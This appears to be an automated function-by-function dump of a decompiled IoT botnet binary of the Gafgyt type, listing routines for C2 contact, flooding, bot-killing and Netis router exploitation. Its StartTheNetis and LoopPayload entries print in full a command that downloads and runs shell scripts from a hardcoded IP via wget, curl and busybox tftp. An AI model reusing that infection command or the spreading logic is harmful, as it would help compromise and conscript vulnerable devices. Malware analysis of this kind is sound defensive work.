                while (true) {
                    v140 = socket_connect(a1, a3);
                __libc_close(v140);
=================FUNCTION : negotiate ===================
++++++++ FUNCTION START 6355
++++++++ FUNCTION END 6543
++++++++ FUNCTION LENGTH 188
        __libc_send(a1, v137, 1, 0x4000);
                __libc_send(a1, v137, 1, 0x4000);
                __libc_send(a1, a2 + 2, 1, 0x4000);
            __libc_send(a1, v137, 1, 0x4000);
            __libc_send(a1, a2 + 2, 1, 0x4000);
        __libc_send(a1, v137, 1, 0x4000);
        __libc_send(a1, a2 + 2, 1, 0x4000);
=================FUNCTION : sendSTD ===================
++++++++ FUNCTION START 11924
++++++++ FUNCTION END 12098
++++++++ FUNCTION LENGTH 174
    int32_t v134 = socket(2, 2, 0); // 0x804e981
    __GI_gethostbyname(a1);
    while (true) {
        random();
            __libc_send(v134, v145, 75, 0);
            __libc_connect(v134, v137, 16);
                __libc_close(v134);
=================FUNCTION : fdpclose ===================
++++++++ FUNCTION START 4009
++++++++ FUNCTION END 4198
++++++++ FUNCTION LENGTH 189
        __libc_close(a1);
        __GI_sigprocmask(0, (struct _TYPEDEF_sigset_t *)&v135, (int32_t)&v137);
        while (true) {
            int32_t v140 = __libc_waitpid(v139, (int32_t)&v138, 0); // 0x8048c65
            __GI_sigprocmask(2, (struct _TYPEDEF_sigset_t *)&v137, 0);
        __GI_sigprocmask(2, (struct _TYPEDEF_sigset_t *)&v137, 0);
=================FUNCTION : sleep ===================
++++++++ FUNCTION START 47862
++++++++ FUNCTION END 48098
++++++++ FUNCTION LENGTH 236
        while (true) {
                    int32_t v140 = __GI_sigprocmask(0, (struct _TYPEDEF_sigset_t *)&v136, v139); // 0x80552b3
                        while (true) {
                                    __GI_sigprocmask(2, (struct _TYPEDEF_sigset_t *)&v138, 0);
                                    __GI_sigprocmask(2, (struct _TYPEDEF_sigset_t *)&v138, 0);
                                    __GI_sigprocmask(2, (struct _TYPEDEF_sigset_t *)&v138, 0);
=================FUNCTION : NetisRanges ===================
++++++++ FUNCTION START 8365
++++++++ FUNCTION END 8509
++++++++ FUNCTION LENGTH 144
    random();
    int32_t v131 = random(); // 0x804ca78
    int32_t v133 = random(); // 0x804cab8
    int32_t v135 = random(); // 0x804caf8
    szprintf(v138, (int32_t)"%d.%d.%d.%d", (int32_t)v139);
    return inet_addr(v138);
=================FUNCTION : recvLine ===================
++++++++ FUNCTION START 5581
++++++++ FUNCTION END 5837
++++++++ FUNCTION LENGTH 256
            while (true) {
                HackerPrint((int32_t)v148, (int32_t)"PING");
                while (true) {
                        if (__libc_recv((int32_t)v148, v145, 1, 0) != 1) {
        while (true) {
    while (true) {
=================FUNCTION : memrchr ===================
++++++++ FUNCTION START 58918
++++++++ FUNCTION END 59230
++++++++ FUNCTION LENGTH 312
        while (true) {
            while (true) {
            while (true) {
        while (true) {
        while (true) {
    while (true) {
=================FUNCTION : StartTheNetis ===================
++++++++ FUNCTION START 10958
++++++++ FUNCTION END 11108
++++++++ FUNCTION LENGTH 150
    while (true) {
        int32_t v138 = socket(2, 2, 0); // 0x804e35a
        NetisRanges(v138);
        sprintf(v137, (int32_t)"%s cd /tmp; wget http://188.213.170.176 /gtop.sh || curl -O http://188.213.170.176 /gtop.sh; chmod 777 gtop.sh; sh gtop.sh; busybox tftp 188.213.170.176  -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; busybox tftp -r tftp2.sh -g 188.213.170.176 ; chmod 777 tftp2.sh; sh tftp2.sh; rm -rf gtop.sh tftp1.sh tftp2.sh;exit\r\n x00");
        __libc_sendto(v138, v137, v139, 0, v135, 16);
=================FUNCTION : inet_pton ===================
++++++++ FUNCTION START 66245
++++++++ FUNCTION END 66664
++++++++ FUNCTION LENGTH 419
            while (true) {
                while (true) {
                    while (true) {
                                    if (inet_pton4(v152, (int32_t)v153, v142) >= 1) {
    inet_pton4(v137, v138, v135);
=================FUNCTION : srandom_r ===================
++++++++ FUNCTION START 46204
++++++++ FUNCTION END 46414
++++++++ FUNCTION LENGTH 210
            while (true) {
                    __GI_random_r((int32_t *)v134, (int32_t)&v140);
                        __GI_random_r((int32_t *)v134, (int32_t)&v140);
            __GI_random_r((int32_t *)v134, (int32_t)&v140);
                __GI_random_r((int32_t *)v134, (int32_t)&v140);
=================FUNCTION : sendCNC ===================
++++++++ FUNCTION START 12449
++++++++ FUNCTION END 12600
++++++++ FUNCTION LENGTH 151
    inet_addr(a1);
        int32_t v136 = socket(2, 1, 0); // 0x804efed
        __libc_connect(v136, (int32_t)&v135, 16);
        __libc_close(v136);
=================FUNCTION : socket_connect ===================
++++++++ FUNCTION START 11570
++++++++ FUNCTION END 11731
++++++++ FUNCTION LENGTH 161
    if (__GI_gethostbyname(a1) != 0) {
        int32_t v139 = socket(2, 1, 6); // 0x804e6f7
        __GI_setsockopt(v139, 6, 1, (int32_t)&v134, 4);
            if (__libc_connect(v139, (int32_t)&v138, 16) != -1) {
=================FUNCTION : readUntil ===================
++++++++ FUNCTION START 6742
++++++++ FUNCTION END 6963
++++++++ FUNCTION LENGTH 221
        while (true) {
            int32_t v140 = __libc_recv(a1, v139, 1, 0); // 0x8049a7b
                int32_t v143 = __libc_recv(a1, v139 + 1, 2, 0); // 0x8049acc
            if (strstr(v135, (char *)a2) == 0) {
=================FUNCTION : strstr ===================
++++++++ FUNCTION START 34812
++++++++ FUNCTION END 35086
++++++++ FUNCTION LENGTH 274
    while (true) {
    while (true) {
                while (true) {
            while (true) {
=================FUNCTION : _stdlib_strto_l ===================
++++++++ FUNCTION START 47053
++++++++ FUNCTION END 47542
++++++++ FUNCTION LENGTH 489
        while (true) {
            while (true) {
            while (true) {
        while (true) {
=================FUNCTION : trim ===================
++++++++ FUNCTION START 1675
++++++++ FUNCTION END 1873
++++++++ FUNCTION LENGTH 198
    while (true) {
                while (true) {
                while (true) {
            while (true) {
=================FUNCTION : botkiller ===================
++++++++ FUNCTION START 11250
++++++++ FUNCTION END 11416
++++++++ FUNCTION LENGTH 166
        __GI_snprintf(v139, 127, (int32_t)">%s.t && cd %s && for a in `ls -a %s`; do >$a; done; >retrieve ;echo ps aux >> proc ; pkill -9 %d\r\n", v144, v143, v142);
        __libc_system(v139);
        sprintf(v146, (int32_t)"pkill -9 %s\r\n");
        result = __libc_system(v146);
=================FUNCTION : abort ===================
++++++++ FUNCTION START 44939
++++++++ FUNCTION END 45151
++++++++ FUNCTION LENGTH 212
    while (true) {
                __GI_sigprocmask(1, (struct _TYPEDEF_sigset_t *)&v136, 0);
                while (true) {
            while (true) {
=================FUNCTION : hostname_to_ip ===================
++++++++ FUNCTION START 5840
++++++++ FUNCTION END 5995
++++++++ FUNCTION LENGTH 155
    if (__GI_gethostbyname(a1) == 0) {
        __GI_herror("gethostbyname");
        strcpy((char *)a2, __GI_inet_ntoa(v135));
=================FUNCTION : listFork ===================
++++++++ FUNCTION START 6186
++++++++ FUNCTION END 6352
++++++++ FUNCTION LENGTH 166
    int32_t result = __libc_fork(v131); // 0x804968a
        while (true) {
                    free(v138);
=================FUNCTION : connectTimeout ===================
++++++++ FUNCTION START 5998
++++++++ FUNCTION END 6183
++++++++ FUNCTION LENGTH 185
    if (getHost(a2, &v135) != 0) {
    int32_t v136 = __libc_connect(a1, (int32_t)&v134, 16); // 0x804952c
                getsockopt(a1, 1, 4, (int32_t)&v144, (int32_t)&v143);
=================FUNCTION : HackerPrint ===================
++++++++ FUNCTION START 3420
++++++++ FUNCTION END 3564
++++++++ FUNCTION LENGTH 144
    print(&v135, a2, (int32_t)&v137);
    int32_t result = __libc_send(a1, v134, _strlen(v136), 0x4000); // 0x804898a
    free(v134);
=================FUNCTION : __GI_fclose ===================
++++++++ FUNCTION START 62168
++++++++ FUNCTION END 62350
++++++++ FUNCTION LENGTH 182
    int32_t v137 = __libc_close(v136); // 0x8057234
        free(v143);
    _stdio_openlist_dec_use();
=================FUNCTION : fflush_unlocked ===================
++++++++ FUNCTION START 64653
++++++++ FUNCTION END 64893
++++++++ FUNCTION LENGTH 240
        _stdio_openlist_dec_use();
    while (true) {
    _stdio_openlist_dec_use();
=================FUNCTION : initConnection ===================
++++++++ FUNCTION START 23843
++++++++ FUNCTION END 24011
++++++++ FUNCTION LENGTH 168
        __libc_close((int32_t)v134);
    int32_t v142 = socket(2, 1, 0); // 0x805135c
    return connectTimeout(v142, v132, v139, 30) == 0;
=================FUNCTION : __GI_vfprintf ===================
++++++++ FUNCTION START 30388
++++++++ FUNCTION END 30567
++++++++ FUNCTION LENGTH 179
        int32_t result = _vfprintf_internal(v137, (char *)a2, a3); // 0x8052698
        result2 = _vfprintf_internal(v136, (char *)a2, a3);
=================FUNCTION : __GI_strpbrk ===================
++++++++ FUNCTION START 59402
++++++++ FUNCTION END 59600
++++++++ FUNCTION LENGTH 198
        while (true) {
                while (true) {
=================FUNCTION : __libc_system ===================
++++++++ FUNCTION START 46594
++++++++ FUNCTION END 46772
++++++++ FUNCTION LENGTH 178
    int32_t v137 = __vfork(v136); // 0x8054f31
    int32_t v138 = wait4(v137, (int32_t)&result, 0, 0); // 0x8054fdb
=================FUNCTION : _uintmaxtostr ===================
++++++++ FUNCTION START 54689
++++++++ FUNCTION END 54932
++++++++ FUNCTION LENGTH 243
        while (true) {
    while (true) {
=================FUNCTION : _vfprintf_internal ===================
++++++++ FUNCTION START 30910
++++++++ FUNCTION END 31693
++++++++ FUNCTION LENGTH 783
    while (true) {
                                                                                while (true) {
=================FUNCTION : __GI_herror ===================
++++++++ FUNCTION START 36999
++++++++ FUNCTION END 37173
++++++++ FUNCTION LENGTH 174
        return fprintf(v136, (int32_t)"%s%s%s\n", v133, v139, v135);
    return fprintf(v136, (int32_t)"%s%s%s\n", v133, v140, v135);
=================FUNCTION : __decode_dotted ===================
++++++++ FUNCTION START 69942
++++++++ FUNCTION END 70167
++++++++ FUNCTION LENGTH 225
            while (true) {
                while (true) {
=================FUNCTION : _stdio_term ===================
++++++++ FUNCTION START 30047
++++++++ FUNCTION END 30234
++++++++ FUNCTION LENGTH 187
        while (true) {
    while (true) {
=================FUNCTION : inet_aton ===================
++++++++ FUNCTION START 59603
++++++++ FUNCTION END 59844
++++++++ FUNCTION LENGTH 241
        while (true) {
            while (true) {
=================FUNCTION : makeRandomStr ===================
++++++++ FUNCTION START 5428
++++++++ FUNCTION END 5578
++++++++ FUNCTION LENGTH 150
        rand_cmwc(v134);
            rand_cmwc(v134);
=================FUNCTION : __GI_initstate_r ===================
++++++++ FUNCTION START 46417
++++++++ FUNCTION END 46591
++++++++ FUNCTION LENGTH 174
        srandom_r(a1, (int32_t *)a4);
    srandom_r(a1, (int32_t *)a4);
=================FUNCTION : _stdio_openlist_dec_use ===================
++++++++ FUNCTION START 64445
++++++++ FUNCTION END 64650
++++++++ FUNCTION LENGTH 205
    while (true) {
                free(v143);
=================FUNCTION : __open_etc_hosts ===================
++++++++ FUNCTION START 68156
++++++++ FUNCTION END 68302
++++++++ FUNCTION LENGTH 146
    int32_t v134 = __GI_fopen((int32_t)"/etc/hosts", (int32_t)&v133); // 0x805835d
        result = __GI_fopen((int32_t)"/etc/config/hosts", (int32_t)&v133);
=================FUNCTION : __GI_wcsnrtombs ===================
++++++++ FUNCTION START 53216
++++++++ FUNCTION END 53478
++++++++ FUNCTION LENGTH 262
            while (true) {
        while (true) {
=================FUNCTION : strcasestr ===================
++++++++ FUNCTION START 35655
++++++++ FUNCTION END 35862
++++++++ FUNCTION LENGTH 207
        while (true) {
            while (true) {
=================FUNCTION : contains_string ===================
++++++++ FUNCTION START 10063
++++++++ FUNCTION END 10231
++++++++ FUNCTION LENGTH 168
    while (true) {
        if (strcasestr((char *)a1, v137) == 0) {
=================FUNCTION : matchPrompt ===================
++++++++ FUNCTION START 6546
++++++++ FUNCTION END 6739
++++++++ FUNCTION LENGTH 193
    while (true) {
                while (true) {
=================FUNCTION : __GI_strspn ===================
++++++++ FUNCTION START 65685
++++++++ FUNCTION END 65876
++++++++ FUNCTION LENGTH 191
    while (true) {
        while (true) {
=================FUNCTION : __malloc_consolidate ===================
++++++++ FUNCTION START 44178
++++++++ FUNCTION END 44460
++++++++ FUNCTION LENGTH 282
        while (true) {
                while (true) {
=================FUNCTION : __GI_fgets_unlocked ===================
++++++++ FUNCTION START 64896
++++++++ FUNCTION END 65110
++++++++ FUNCTION LENGTH 214
            while (true) {
                int32_t v141 = getc_unlocked(); // 0x80579fd
=================FUNCTION : __GI_sigprocmask ===================
++++++++ FUNCTION START 28289
++++++++ FUNCTION END 28462
++++++++ FUNCTION LENGTH 173
        v135 = sigprocmask(how, set, oset);
    v135 = sigprocmask(how, set, oset);
=================FUNCTION : __stdio_WRITE ===================
++++++++ FUNCTION START 53622
++++++++ FUNCTION END 53832
++++++++ FUNCTION LENGTH 210
    while (true) {
            while (true) {
=================FUNCTION : rawmemchr ===================
++++++++ FUNCTION START 65453
++++++++ FUNCTION END 65682
++++++++ FUNCTION LENGTH 229
        while (true) {
    while (true) {
=================FUNCTION : getdtablesize ===================
++++++++ FUNCTION START 26338
++++++++ FUNCTION END 26481
++++++++ FUNCTION LENGTH 143
    if ((uint32_t)getrlimit(7, (int32_t)&result) >= 0) {
=================FUNCTION : __GI_strcasecmp ===================
++++++++ FUNCTION START 69558
++++++++ FUNCTION END 69724
++++++++ FUNCTION LENGTH 166
    while (true) {
=================FUNCTION : _fini ===================
++++++++ FUNCTION START 71019
++++++++ FUNCTION END 71157
++++++++ FUNCTION LENGTH 138
    __get_pc_thunk_bx(v134);
=================FUNCTION : kill ===================
++++++++ FUNCTION START 27087
++++++++ FUNCTION END 27235
++++++++ FUNCTION LENGTH 148
    int32_t v136 = kill(v134, v135); // 0x8052147
=================FUNCTION : _ppfs_setargs ===================
++++++++ FUNCTION START 32040
++++++++ FUNCTION END 32339
++++++++ FUNCTION LENGTH 299
        while (true) {
=================FUNCTION : __raise ===================
++++++++ FUNCTION START 61584
++++++++ FUNCTION END 61720
++++++++ FUNCTION LENGTH 136
    return kill(__libc_getpid(), a1);
=================FUNCTION : __libc_getpid ===================
++++++++ FUNCTION START 26634
++++++++ FUNCTION END 26782
++++++++ FUNCTION LENGTH 148
    int32_t pid = getpid(v134); // 0x80520a1
=================FUNCTION : getHost ===================
++++++++ FUNCTION START 4753
++++++++ FUNCTION END 4890
++++++++ FUNCTION LENGTH 137
    int32_t v134 = inet_addr(a1); // 0x8048ee7
=================FUNCTION : get_telstate_host ===================
++++++++ FUNCTION START 9348
++++++++ FUNCTION END 9485
++++++++ FUNCTION LENGTH 137
    return __GI_inet_ntoa(v134);
=================FUNCTION : __vfork ===================
++++++++ FUNCTION START 24994
++++++++ FUNCTION END 25131
++++++++ FUNCTION LENGTH 137
    uint32_t result = vfork(); // 0x8051e86
=================FUNCTION : rand ===================
++++++++ FUNCTION START 45154
++++++++ FUNCTION END 45290
++++++++ FUNCTION LENGTH 136
    return random();
=================FUNCTION : __GI_setsockopt ===================
++++++++ FUNCTION START 39158
++++++++ FUNCTION END 39293
++++++++ FUNCTION LENGTH 135
    return __socketcall(14, (int32_t)&a1);
=================FUNCTION : __libc_sendto ===================
++++++++ FUNCTION START 39020
++++++++ FUNCTION END 39155
++++++++ FUNCTION LENGTH 135
    return __socketcall(11, (int32_t)&a1);
=================FUNCTION : inet_pton4 ===================
++++++++ FUNCTION START 66027
++++++++ FUNCTION END 66242
++++++++ FUNCTION LENGTH 215
        while (true) {
=================FUNCTION : makeIPPacket ===================
++++++++ FUNCTION START 9057
++++++++ FUNCTION END 9198
++++++++ FUNCTION LENGTH 141
    rand_cmwc((int32_t)v135);
=================FUNCTION : __GI_inet_ntoa ===================
++++++++ FUNCTION START 37339
++++++++ FUNCTION END 37475
++++++++ FUNCTION LENGTH 136
    return __GI_inet_ntoa_r(a1, (int32_t)&v133);
=================FUNCTION : __bsd_signal ===================
++++++++ FUNCTION START 39727
++++++++ FUNCTION END 39910
++++++++ FUNCTION LENGTH 183
        while (true) {
=================FUNCTION : fgets ===================
++++++++ FUNCTION START 64285
++++++++ FUNCTION END 64442
++++++++ FUNCTION LENGTH 157
    int32_t result = __GI_fgets_unlocked((char *)a1, a2, a3, v137); // 0x805776a
=================FUNCTION : _charpad ===================
++++++++ FUNCTION START 30570
++++++++ FUNCTION END 30737
++++++++ FUNCTION LENGTH 167
    while (true) {
=================FUNCTION : __encode_dotted ===================
++++++++ FUNCTION START 69727
++++++++ FUNCTION END 69939
++++++++ FUNCTION LENGTH 212
    while (true) {
=================FUNCTION : parseHex ===================
++++++++ FUNCTION START 4382
++++++++ FUNCTION END 4545
++++++++ FUNCTION LENGTH 163
    while (true) {
=================FUNCTION : __GI_snprintf ===================
++++++++ FUNCTION START 29332
++++++++ FUNCTION END 29469
++++++++ FUNCTION LENGTH 137
    return __GI_vsnprintf((char *)a1, a2, a3, (int32_t)&v134);
=================FUNCTION : __GI_strcoll ===================
++++++++ FUNCTION START 65113
++++++++ FUNCTION END 65275
++++++++ FUNCTION LENGTH 162
    while (true) {
=================FUNCTION : isatty ===================
++++++++ FUNCTION START 36004
++++++++ FUNCTION END 36140
++++++++ FUNCTION LENGTH 136
    return __GI_tcgetattr(a1, &v134) == 0;
=================FUNCTION : tcpcsum ===================
++++++++ FUNCTION START 8915
++++++++ FUNCTION END 9054
++++++++ FUNCTION LENGTH 139
    free(v134);
=================FUNCTION : __GI_strncat ===================
++++++++ FUNCTION START 65278
++++++++ FUNCTION END 65450
++++++++ FUNCTION LENGTH 172
        while (true) {
=================FUNCTION : __get_hosts_byname_r ===================
++++++++ FUNCTION START 61445
++++++++ FUNCTION END 61581
++++++++ FUNCTION LENGTH 136
    return __read_etc_hosts_r(0, a1, a2, 0, (int32_t *)a3, a4, a5, a6, a7);
=================FUNCTION : szprintf ===================
++++++++ FUNCTION START 3280
++++++++ FUNCTION END 3417
++++++++ FUNCTION LENGTH 137
    return print(&v134, a1, (int32_t)&v135);
=================FUNCTION : __libc_recv ===================
++++++++ FUNCTION START 38744
++++++++ FUNCTION END 38879
++++++++ FUNCTION LENGTH 135
    return __socketcall(10, (int32_t)&a1);
=================FUNCTION : strnlen ===================
++++++++ FUNCTION START 34644
++++++++ FUNCTION END 34809
++++++++ FUNCTION LENGTH 165
    while (true) {
=================FUNCTION : strncpy ===================
++++++++ FUNCTION START 34476
++++++++ FUNCTION END 34641
++++++++ FUNCTION LENGTH 165
    while (true) {
=================FUNCTION : read_with_timeout ===================
++++++++ FUNCTION START 9633
++++++++ FUNCTION END 9782
++++++++ FUNCTION LENGTH 149
        result = __libc_recv(a1, a3, a4, 0);
=================FUNCTION : __length_dotted ===================
++++++++ FUNCTION START 70170
++++++++ FUNCTION END 70347
++++++++ FUNCTION LENGTH 177
    while (true) {
=================FUNCTION : sprintf ===================
++++++++ FUNCTION START 29472
++++++++ FUNCTION END 29609
++++++++ FUNCTION LENGTH 137
    return __GI_vsnprintf((char *)a1, -1, a2, (int32_t)&v134);
=================FUNCTION : wait4 ===================
++++++++ FUNCTION START 52622
++++++++ FUNCTION END 52772
++++++++ FUNCTION LENGTH 150
    int32_t v138 = wait4(v134, v136, v135, v137); // 0x8055af1
=================FUNCTION : inet_addr ===================
++++++++ FUNCTION START 37478
++++++++ FUNCTION END 37621
++++++++ FUNCTION LENGTH 143
    if (inet_aton((char *)a1, (int32_t)&result) != 0) {
=================FUNCTION : __GI_clock_getres ===================
++++++++ FUNCTION START 51234
++++++++ FUNCTION END 51381
++++++++ FUNCTION LENGTH 147
    int32_t v134 = clock_getres(clk_id, res); // 0x8055937
=================FUNCTION : __libc_open ===================
++++++++ FUNCTION START 27238
++++++++ FUNCTION END 27390
++++++++ FUNCTION LENGTH 152
    int32_t fd = open(path, 0x1000000 * a2 / 0x1000000); // 0x8052193
=================FUNCTION : __libc_fork ===================
++++++++ FUNCTION START 26187
++++++++ FUNCTION END 26335
++++++++ FUNCTION LENGTH 148
    int32_t v135 = fork(v134); // 0x8052029
=================FUNCTION : csum ===================
++++++++ FUNCTION START 8652
++++++++ FUNCTION END 8912
++++++++ FUNCTION LENGTH 260
        while (true) {
=================FUNCTION : zprintf ===================
++++++++ FUNCTION START 3141
++++++++ FUNCTION END 3277
++++++++ FUNCTION LENGTH 136
    return print(NULL, a1, (int32_t)&v134);
=================FUNCTION : getsockopt ===================
++++++++ FUNCTION START 38606
++++++++ FUNCTION END 38741
++++++++ FUNCTION LENGTH 135
    return __socketcall(15, (int32_t)&a1);
=================FUNCTION : random ===================
++++++++ FUNCTION START 45293
++++++++ FUNCTION END 45436
++++++++ FUNCTION LENGTH 143
    __GI_random_r(&v135, (int32_t)&result);
=================FUNCTION : fprintf ===================
++++++++ FUNCTION START 53481
++++++++ FUNCTION END 53619
++++++++ FUNCTION LENGTH 138
    return __GI_vfprintf((int16_t *)a1, a2, (int32_t)&v135, v134);
=================FUNCTION : __check_one_fd ===================
++++++++ FUNCTION START 49479
++++++++ FUNCTION END 49629
++++++++ FUNCTION LENGTH 150
    if (__libc_open("/dev/null", v136) != v134) {
=================FUNCTION : __libc_creat ===================
++++++++ FUNCTION START 27393
++++++++ FUNCTION END 27529
++++++++ FUNCTION LENGTH 136
    return __libc_open((char *)a1, 577);
=================FUNCTION : srand ===================
++++++++ FUNCTION START 45734
++++++++ FUNCTION END 45875
++++++++ FUNCTION LENGTH 141
    srandom_r(a1, &v135);
=================FUNCTION : sclose ===================
++++++++ FUNCTION START 9201
++++++++ FUNCTION END 9345
++++++++ FUNCTION LENGTH 144
        __libc_close(a1);
=================FUNCTION : LoopPayload ===================
++++++++ FUNCTION START 11111
++++++++ FUNCTION END 11247
++++++++ FUNCTION LENGTH 136
    return __libc_system((int32_t)"cd /tmp; wget http://188.213.170.176 /gtop.sh || curl -O http://188.213.170.176 /gtop.sh; chmod 777 gtop.sh; sh gtop.sh; busybox tftp 188.213.170.176  -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; busybox tftp -r tftp2.sh -g 188.213.170.176 ; chmod 777 tftp2.sh; sh tftp2.sh; rm -rf gtop.sh tftp1.sh tftp2.sh;exit\r\n");
=================FUNCTION : __libc_connect ===================
++++++++ FUNCTION START 38330
++++++++ FUNCTION END 38465
++++++++ FUNCTION LENGTH 135
    return __socketcall(3, (int32_t)&a1);
=================FUNCTION : __GI_gethostbyname ===================
++++++++ FUNCTION START 37624
++++++++ FUNCTION END 37763
++++++++ FUNCTION LENGTH 139
    gethostbyname_r(a1, &v135, (int32_t)&v134, 460, (int32_t)&result, v132, v133, v133);
=================FUNCTION : __libc_send ===================
++++++++ FUNCTION START 38882
++++++++ FUNCTION END 39017
++++++++ FUNCTION LENGTH 135
    return __socketcall(9, (int32_t)&a1);
=================FUNCTION : __GI_inet_ntoa_r ===================
++++++++ FUNCTION START 37176
++++++++ FUNCTION END 37336
++++++++ FUNCTION LENGTH 160
    while (true) {
=================FUNCTION : __libc_waitpid ===================
++++++++ FUNCTION START 28615
++++++++ FUNCTION END 28751
++++++++ FUNCTION LENGTH 136
    return wait4(a1, a2, a3, 0);
=================FUNCTION : _ppfs_init ===================
++++++++ FUNCTION START 31696
++++++++ FUNCTION END 31891
++++++++ FUNCTION LENGTH 195
        while (true) {
=================FUNCTION : __GI_vsnprintf ===================
++++++++ FUNCTION START 29612
++++++++ FUNCTION END 29759
++++++++ FUNCTION LENGTH 147
    int32_t result = _vfprintf_internal(v135, (char *)a3, a4); // 0x80524da
=================FUNCTION : __libc_close ===================
++++++++ FUNCTION START 25886
++++++++ FUNCTION END 26033
++++++++ FUNCTION LENGTH 147
    int32_t v134 = close(fd); // 0x8051fcc
=================FUNCTION : __GI_strchr ===================
++++++++ FUNCTION START 34160
++++++++ FUNCTION END 34319
++++++++ FUNCTION LENGTH 159
    while (true) {
=================FUNCTION : fdgets ===================
++++++++ FUNCTION START 4201
++++++++ FUNCTION END 4379
++++++++ FUNCTION LENGTH 178
    while (true) {
=================FUNCTION : socket ===================
++++++++ FUNCTION START 39296
++++++++ FUNCTION END 39431
++++++++ FUNCTION LENGTH 135
    return __socketcall(1, (int32_t)&a1);
=================FUNCTION : inet_ntop4 ===================
++++++++ FUNCTION START 66667
++++++++ FUNCTION END 66878
++++++++ FUNCTION LENGTH 211
    while (true) {
=================FUNCTION : HackerScan ===================
++++++++ FUNCTION START 8512
++++++++ FUNCTION END 8649
++++++++ FUNCTION LENGTH 137
    return rand_cmwc(v134) & -1 - a1 ^ v134;
=================FUNCTION : __GI_getsockname ===================
++++++++ FUNCTION START 38468
++++++++ FUNCTION END 38603
++++++++ FUNCTION LENGTH 135
    return __socketcall(6, (int32_t)&a1);
=================FUNCTION : __GI_fopen ===================
++++++++ FUNCTION START 62353
++++++++ FUNCTION END 62489
++++++++ FUNCTION LENGTH 136
    return _stdio_fopen(a1, (char *)a2, 0, -1);
================================================================================
========	WHILE LOOPS INTRESTING INSTRUCTIONS : =================================
================================================================================
=============================WHILE LOOPS ID : 1 @ trim ====================================
++++++++ WHILE START : 1813 
++++++++ WHILE FUNCTION : trim 
++++++++ WHILE END : 1872 
++++++++ INTRESTING INSTRUCTIONS :  
		while (true) {
		while (true) {
		while (true) {
=============================WHILE LOOPS ID : 2 @ prints ====================================
++++++++ WHILE START : 2211 
++++++++ WHILE FUNCTION : prints 
++++++++ WHILE END : 2225 
++++++++ INTRESTING INSTRUCTIONS :  
		printchar(v136, v135);
=============================WHILE LOOPS ID : 3 @ prints ====================================
++++++++ WHILE START : 2356 
++++++++ WHILE FUNCTION : prints 
++++++++ WHILE END : 2370 
++++++++ INTRESTING INSTRUCTIONS :  
		printchar(v136, v135);
=============================WHILE LOOPS ID : 5 @ print ====================================
++++++++ WHILE START : 2877 
++++++++ WHILE FUNCTION : print 
++++++++ WHILE END : 3128 
++++++++ INTRESTING INSTRUCTIONS :  
		printchar(a1, (int32_t)*v138);
		while (true) {
		int32_t v155 = prints(v134, (char *)&v135, v148, v145); // 0x804884a
		int32_t v157 = printi(v134, (int64_t)v156, 10, 0, v148, v145, 97) + result2; // 0x804880c
		int32_t v159 = printi(v134, (int64_t)v158, 16, 0, v148, v145, 65) + result2; // 0x80487b8
		int32_t v161 = printi(v134, (int64_t)v160, 16, 0, v148, v145, 97) + result2; // 0x8048764
		int32_t v163 = printi(v134, (int64_t)v162, 10, 1, v148, v145, 97) + result2; // 0x8048710
		v141 = prints(v134, v164, v148, v145) + result2;
=============================WHILE LOOPS ID : 6 @ fdpclose ====================================
++++++++ WHILE START : 4164 
++++++++ WHILE FUNCTION : fdpclose 
++++++++ WHILE END : 4188 
++++++++ INTRESTING INSTRUCTIONS :  
		int32_t v140 = __libc_waitpid(v139, (int32_t)&v138, 0); // 0x8048c65
		__GI_sigprocmask(2, (struct _TYPEDEF_sigset_t *)&v137, 0);
=============================WHILE LOOPS ID : 9 @ getBogos ====================================
++++++++ WHILE START : 5190 
++++++++ WHILE FUNCTION : getBogos 
++++++++ WHILE END : 5250 
++++++++ INTRESTING INSTRUCTIONS :  
		uppercase((char *)&v135);
		if (strstr(v136, "BOGOMIPS") != v136) {
		if (fdgets(v136, 0x1000, v134) == 0) {
		while (true) {
		while (true) {
		__libc_close(v134);
=============================WHILE LOOPS ID : 10 @ getCores ====================================
++++++++ WHILE START : 5404 
++++++++ WHILE FUNCTION : getCores 
++++++++ WHILE END : 5421 
++++++++ INTRESTING INSTRUCTIONS :  
		uppercase((char *)&v135);
		if (strstr(v136, "BOGOMIPS") == v136) {
		if (fdgets(v136, 0x1000, v134) == 0) {
=============================WHILE LOOPS ID : 11 @ recvLine ====================================
++++++++ WHILE START : 5737 
++++++++ WHILE FUNCTION : recvLine 
++++++++ WHILE END : 5798 
++++++++ INTRESTING INSTRUCTIONS :  
		HackerPrint((int32_t)v148, (int32_t)"PING");
		while (true) {
		if (__libc_recv((int32_t)v148, v145, 1, 0) != 1) {
=============================WHILE LOOPS ID : 14 @ listFork ====================================
++++++++ WHILE START : 6331 
++++++++ WHILE FUNCTION : listFork 
++++++++ WHILE END : 6348 
++++++++ INTRESTING INSTRUCTIONS :  
		free(v138);
=============================WHILE LOOPS ID : 15 @ matchPrompt ====================================
++++++++ WHILE START : 6686 
++++++++ WHILE FUNCTION : matchPrompt 
++++++++ WHILE END : 6738 
++++++++ INTRESTING INSTRUCTIONS :  
		while (true) {
=============================WHILE LOOPS ID : 16 @ readUntil ====================================
++++++++ WHILE START : 6880 
++++++++ WHILE FUNCTION : readUntil 
++++++++ WHILE END : 6957 
++++++++ INTRESTING INSTRUCTIONS :  
		int32_t v140 = __libc_recv(a1, v139, 1, 0); // 0x8049a7b
		int32_t v143 = __libc_recv(a1, v139 + 1, 2, 0); // 0x8049acc
		if (strstr(v135, (char *)a2) == 0) {
=============================WHILE LOOPS ID : 18 @ contains_string ====================================
++++++++ WHILE START : 10212 
++++++++ WHILE FUNCTION : contains_string 
++++++++ WHILE END : 10228 
++++++++ INTRESTING INSTRUCTIONS :  
		if (strcasestr((char *)a1, v137) == 0) {
=============================WHILE LOOPS ID : 19 @ StartTheLelz ====================================
++++++++ WHILE START : 10384 
++++++++ WHILE FUNCTION : StartTheLelz 
++++++++ WHILE END : 10954 
++++++++ INTRESTING INSTRUCTIONS :  
		case 0: {
		socket(0x10000 * v155 / 0x10000, v156, v154);
		if (__libc_connect(v156, v154, 0) == -1) {
		sclose(v156);
		socket(0x10000 * v155 / 0x10000, v156, v154);
		case 1: {
		sclose(v151);
		sclose(v166);
		getsockopt(v151, v167, v165, 10, v161);
		sclose(v151);
		case 2: {
		case 3: {
		if (__libc_send(v168, v137, v148, (int32_t)&v152) >= 0) {
		if (__libc_send(v168, v137, v148, (int32_t)&v152) >= 0) {
		case 4: {
		case 5: {
		if (__libc_send(v169, v142, v137, v148) >= 0) {
